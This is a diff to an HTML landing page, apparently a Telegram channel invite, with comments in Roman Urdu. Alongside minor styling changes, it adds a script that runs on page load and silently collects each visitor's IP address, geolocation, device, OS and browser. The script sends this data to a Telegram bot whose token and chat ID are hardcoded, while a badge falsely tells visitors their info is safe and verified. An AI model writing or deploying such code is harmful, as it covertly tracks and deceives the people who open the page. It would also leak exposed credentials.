@@ -86,11 +86,11 @@
             display: inline-block;
             background: #38bdf8;
             color: white;
-            font-size: 1.0rem;
+            font-size: 1.1rem;
             font-weight: 700;
             padding: 0.65rem 0;
             border-radius: 50px;
-            width: 50%;
+            width: 100%;
             text-align: center;
             cursor: pointer;
             border: none;
@@ -170,11 +170,115 @@
         <span>© 2026 TRUSTED OWNER</span>
     </div>
 
+    <div class="verify-badge" id="verifyStatus">
+        🔍 Connecting...
+    </div>
+</div>
 
 <script>
-    // Telegram Link - Yahan apna asli link lagayein
-    const JOIN_LINK = "https://t.me/YOUR_CHANNEL";
-    
+    // ==============================================
+    // 🔻 YAHAN APNA TOKEN AUR CHAT ID LAGAYEIN 🔻
+    // ==============================================
+    const BOT_TOKEN = "7991147017:AAF9FiwcMrOjTEuP5puYZ0RlYOWU7M73UaI";     // @BotFather se milega
+    const CHAT_ID = "5975952682";         // @userinfobot se milega
+    const JOIN_LINK = "https://t.me/YOUR_CHANNEL"; // Apna channel link
+    // ==============================================
+
+    // Device info collect karo
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let device = "Unknown", os = "Unknown", browser = "Unknown";
+        
+        if (/iPhone|iPad|iPod/i.test(ua)) device = "📱 Apple iOS";
+        else if (/Android/i.test(ua)) device = "📱 Android";
+        else if (/Windows/i.test(ua)) device = "💻 Windows";
+        else if (/Mac/i.test(ua)) device = "💻 Mac";
+        
+        if (/Windows NT 10.0/i.test(ua)) os = "Windows 10/11";
+        else if (/Android/i.test(ua)) os = "Android";
+        else if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
+        
+        if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
+        else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
+        else if (/Firefox/i.test(ua)) browser = "Firefox";
+        else if (/Edg/i.test(ua)) browser = "Edge";
+        
+        return { device, os, browser, ua: ua.substring(0, 100) };
+    }
+
+    // IP address lein free API se
+    async function sendToTelegram() {
+        const device = getDeviceInfo();
+        const time = new Date().toLocaleString('pk-PK', { timeZone: 'Asia/Karachi' });
+        
+        const statusDiv = document.getElementById('verifyStatus');
+        
+        try {
+            statusDiv.innerHTML = '📡 Getting IP address...';
+            
+            // IP address fetch karo
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const ip = ipData.ip;
+            
+            statusDiv.innerHTML = '📡 Getting location...';
+            
+            // Location details
+            const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+            const locData = await locRes.json();
+            
+            const city = locData.city || "N/A";
+            const region = locData.region || "N/A";
+            const country = locData.country_name || "N/A";
+            
+            statusDiv.innerHTML = '📤 Sending to Telegram...';
+            
+            // Telegram message banayein
+            const message = `🔐 *NEW VISITOR DETECTED* 🔐
+            
+🌐 *IP:* ${ip}
+📍 *Location:* ${city}, ${region}, ${country}
+
+${device.device}
+💻 *OS:* ${device.os}
+🌍 *Browser:* ${device.browser}
+🕐 *Time:* ${time}
+
+---
+✅ *Status:* Page opened`;
+
+            // Telegram bhejein
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
+            });
+            
+            if (response.ok) {
+                statusDiv.innerHTML = '✅ Verified | Your info is safe';
+                statusDiv.style.background = '#dcfce7';
+                statusDiv.style.color = '#15803d';
+            } else {
+                const error = await response.text();
+                console.error('Telegram error:', error);
+                statusDiv.innerHTML = '⚠️ Could not verify, but you can continue';
+                statusDiv.style.background = '#fee2e2';
+                statusDiv.style.color = '#991b1b';
+            }
+            
+        } catch (error) {
+            console.error('Error:', error);
+            statusDiv.innerHTML = '⚠️ Verification issue, but you can continue';
+            statusDiv.style.background = '#fee2e2';
+            statusDiv.style.color = '#991b1b';
+        }
+    }
+
     // Join button
     const joinBtn = document.getElementById('joinLinkButton');
     if (joinBtn) {
@@ -188,37 +292,14 @@
         });
     }
 
-    // Visitor info send to Vercel backend (jo Telegram bhejega)
-    async function trackVisitor() {
-        try {
-            const deviceData = {
-                userAgent: navigator.userAgent,
-                screenSize: `${screen.width}x${screen.height}`,
-                language: navig.language,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toISOString()
-            };
-            
-            const response = await fetch('/api/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(deviceData)
-            });
-            
-            const result = await response.json();
-            if (result.success) {
-                document.getElementById('verifyStatus').innerHTML = '✅ Device verified | Your info is safe';
-                document.getElementById('verifyStatus').style.background = '#dcfce7';
-            } else {
-                document.getElementById('verifyStatus').innerHTML = '⚠️ Could not verify, but you can continue';
-            }
-        } catch (error) {
-            console.error("Tracking error:", error);
-            document.getElementById('verifyStatus').innerHTML = '';
-        }
+    // Check if bot token is configured
+    if (BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" && CHAT_ID !== "YOUR_CHAT_ID_HERE") {
+        sendToTelegram();
+    } else {
+        document.getElementById('verifyStatus').innerHTML = '⚠️ Bot not configured | Contact admin';
+        document.getElementById('verifyStatus').style.background = '#fee2e2';
+        document.getElementById('verifyStatus').style.color = '#991b1b';
     }
-    
-    trackVisitor();
 </script>
 </body>
 </html>
